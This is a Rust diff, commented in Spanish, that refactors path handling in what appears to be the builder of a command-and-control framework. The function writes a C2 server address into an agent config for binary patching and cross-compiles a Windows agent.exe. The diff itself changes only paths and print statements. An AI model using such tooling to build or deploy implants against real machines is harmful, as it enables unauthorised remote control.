@@ -13,21 +13,28 @@ pub fn generate_agent(
     println!("🔧 Generando configuración del agente...");
 
     // Determine workspace root and agent path
-    let (workspace_root, agent_relative_path) = if std::env::current_dir()?
-        .to_string_lossy()
-        .contains("target/release")
-    {
-        ("../../".to_string(), "../../agent".to_string())
+    let current_dir = std::env::current_dir()?;
+    let current_path = current_dir.to_string_lossy();
+    
+    let (workspace_root, agent_relative_path) = if current_path.contains("target/release") {
+        // Running from target/release
+        let root = current_dir.parent().unwrap().parent().unwrap();
+        (root.to_path_buf(), root.join("agent"))
+    } else if current_path.ends_with("builder") || current_path.contains("\\builder") || current_path.contains("/builder") {
+        // Running from builder directory
+        let root = current_dir.parent().unwrap();
+        (root.to_path_buf(), root.join("agent"))
     } else {
-        (".".to_string(), "agent".to_string())
+        // Running from workspace root
+        (current_dir.clone(), current_dir.join("agent"))
     };
 
     // Crear directorios si no existen
-    let config_dir = format!("{}/src", agent_relative_path);
+    let config_dir = agent_relative_path.join("src");
     std::fs::create_dir_all(&config_dir)?;
 
     // Generar config.rs con marcador para binary patching
-    let config_file_path = format!("{}/src/config.rs", agent_relative_path);
+    let config_file_path = config_dir.join("config.rs");
     let mut config_file = File::create(&config_file_path)?;
 
     // Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
@@ -119,7 +126,7 @@ pub fn generate_agent(
         c2_server
     )?;
 
-    println!("✅ Configuración escrita en {}", config_file_path);
+    println!("✅ Configuración escrita en {}", config_file_path.display());
     println!("🌐 Servidor C2 configurado: {}", c2_server);
 
     // Compilar el agente con features apropiadas
@@ -145,11 +152,9 @@ pub fn generate_agent(
 
     if output.status.success() {
         println!("✅ Compilación exitosa!");
-        let exe_path = format!(
-            "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
-            workspace_root
-        );
-        println!("🏃 Ejecutable generado en {}", exe_path);
+        let exe_path = workspace_root
+            .join("target/x86_64-pc-windows-gnu/release/agent.exe");
+        println!("🏃 Ejecutable generado en {}", exe_path.display());
 
         // Copiar ejecutable
         let dest_path = format!("{}.exe", output_name);
@@ -158,7 +163,7 @@ pub fn generate_agent(
         } else {
             println!(
                 "⚠️  No se pudo copiar el ejecutable, está en: {}",
-                exe_path
+                exe_path.display()
             );
         }
     } else {
